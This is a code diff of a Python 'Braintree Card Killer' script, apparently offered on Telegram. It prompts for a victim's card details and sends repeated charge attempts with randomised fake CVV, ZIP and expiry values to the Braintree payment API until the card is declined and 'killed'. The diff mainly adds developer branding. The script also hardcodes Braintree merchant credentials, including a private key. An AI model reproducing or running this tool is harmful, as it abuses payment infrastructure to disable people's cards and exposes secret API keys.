@@ -1,3 +1,10 @@
+# =========================================================
+# 👑 DEVELOPER TELEGRAM: @tgekaiva
+# 👑 SCRIPT: BRAINTREE KILLER (LIVE API FLOW)
+# 👑 AUTHOR / DEV: @tgekaiva
+# =========================================================
+
+# Developer Telegram: @tgekaiva - Required imports
 import os
 import requests
 import time
@@ -5,9 +12,10 @@ import random
 import threading
 from base64 import b64encode
 
-# ====== USER INPUT ======
+# Developer Telegram: @tgekaiva - User input prompt
 print("=" * 50)
 print("[$] BRAINTREE CARD KILLER (LIVE API FLOW)")
+print("[$] Developer Telegram: @tgekaiva")
 print("=" * 50)
 
 card_number = input("Enter Card Number: ")
@@ -16,7 +24,7 @@ exp_year = input("Enter Expiry Year (YYYY): ")
 cvv_real = input("Enter CVV: ")
 zip_real = input("Enter ZIP Code: ")
 
-# ====== BRAINTREE CREDENTIALS ======
+# Developer Telegram: @tgekaiva - Braintree credentials & auth
 BT_MERCHANT_ID = os.environ.get("BT_MERCHANT_ID", "bdwz9z4gc6nv8f64")
 BT_PUBLIC_KEY = os.environ.get("BT_PUBLIC_KEY", "xj9zfs349qy4z8jh")
 BT_PRIVATE_KEY = os.environ.get("BT_PRIVATE_KEY", "d39e8c36ef9e237c16e41169b110f177")
@@ -29,20 +37,20 @@ headers = {
     "Content-Type": "application/json"
 }
 
-gateway_url = f"https://payments.sandbox.braintree-api.com/graphql"
+gateway_url = "https://payments.sandbox.braintree-api.com/graphql"
 
 loading = True
 start_time = time.time()
 
-# ====== LOADING BAR ======
+# Developer Telegram: @tgekaiva - Loading animation
 def animate_loading():
     bar = ["[#####]", "[#### ]", "[###  ]", "[##   ]", "[#    ]"]
     while loading:
         for stage in bar:
-            print(f"\rProcessing {stage}", end="", flush=True)
+            print(f"\rProcessing {stage} | Dev: @tgekaiva", end="", flush=True)
             time.sleep(0.3)
 
-# ====== CHARGE FUNCTION ======
+# Developer Telegram: @tgekaiva - Charge tokenization request
 def send_braintree_charge(cvv, zip_code, month, year):
     payload = {
         "query": """
@@ -83,7 +91,7 @@ def send_braintree_charge(cvv, zip_code, month, year):
     except Exception as e:
         return "timeout"
 
-# ====== MAIN KILLER LOGIC ======
+# Developer Telegram: @tgekaiva - Main Killer logic
 def kill_card():
     global loading
     attempt = 0
@@ -98,7 +106,7 @@ def kill_card():
 
             attempt += 1
             result = send_braintree_charge(fake_cvv, fake_zip, fake_month, fake_year)
-            print(f"\n[Attempt {attempt}] Fake charge: {result}")
+            print(f"\n[Attempt {attempt}] Fake charge: {result} | Dev: @tgekaiva")
 
         # Real charge
         result = send_braintree_charge(cvv_real, zip_real, exp_month, exp_year)
@@ -106,13 +114,13 @@ def kill_card():
         if result == "declined":
             killed = True
         else:
-            print("\n[+] Card still alive... Retrying!\n")
+            print("\n[+] Card still alive... Retrying! | Dev: @tgekaiva\n")
 
     loading = False
     duration = round(time.time() - start_time, 2)
-    print(f"\n[X] CARD SUCCESSFULLY KILLED! [Time: {duration}s]")
+    print(f"\n[X] CARD SUCCESSFULLY KILLED! [Time: {duration}s] | Developer Telegram: @tgekaiva")
 
-# ====== RUNNING THREADS ======
+# Developer Telegram: @tgekaiva - Thread execution
 t1 = threading.Thread(target=animate_loading)
 t2 = threading.Thread(target=kill_card)
 
